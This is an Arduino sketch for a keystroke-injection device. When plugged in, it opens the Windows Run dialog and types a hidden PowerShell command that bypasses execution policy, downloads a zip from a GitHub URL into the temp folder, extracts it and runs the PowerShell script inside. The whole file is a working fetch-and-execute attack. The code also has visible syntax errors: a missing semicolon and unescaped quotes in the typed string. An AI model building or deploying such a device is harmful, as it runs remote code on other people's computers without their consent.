#include <Keyboard.h>

void setup() {

  Keyboard.begin(); //start keyboard communication 
   delay(600);
   Keyboard.press(KEY_LEFT_GUI);
   delay(600); 
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   Keyboard.release('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI)
   delay(600); 
   Keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1");
   delay(600);
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   Keyboard.end();
 }

void loop() {}
